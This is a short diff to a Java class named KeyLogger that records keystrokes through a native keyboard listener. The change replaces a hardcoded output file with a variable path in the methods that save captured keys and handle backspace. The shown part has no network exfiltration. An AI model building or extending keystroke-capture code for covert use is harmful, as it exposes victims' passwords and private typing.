@@ -57,7 +57,7 @@ public class KeyLogger implements NativeKeyListener {
     }
     public void addKey(int keyCode) {
         keyboardList.setKeyCode(keyCode);
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter("E:/files.txt"))) {
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName.toFile()))) {
             String keyText1 = keyboardList.getKeyCode();
             line += keyText1;
             writer.write(line);
@@ -67,7 +67,7 @@ public class KeyLogger implements NativeKeyListener {
     }
     public void backspaceKey() {
 //        delete the last char from the string
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter("E:/files.txt"))) {
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName.toFile()))) {
             StringBuilder sb = new StringBuilder(line);
             sb.deleteCharAt(line.length() - 1);
             line = sb.toString();
